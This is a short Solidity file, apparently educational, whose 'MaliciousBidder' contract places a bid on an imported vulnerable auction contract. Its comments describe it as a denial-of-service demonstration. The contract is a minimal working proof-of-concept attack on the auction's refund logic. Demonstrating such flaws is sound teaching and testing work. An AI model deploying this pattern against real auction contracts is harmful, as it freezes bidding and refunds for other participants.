// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./VulnerableAuction.sol";

/// @title Malicious Bidder Contract
/// @author Ishan Lakhwani
/// @notice This contract demonstrates how to perform a DoS attack on the auction
/// @dev This is an educational example of what NOT to do

contract MaliciousBidder {
    VulnerableAuction public auction;

    constructor(VulnerableAuction _auction) {
        auction = _auction;
    }

    function attack() public payable {
        auction.placeBid{value: msg.value}();
    }
}
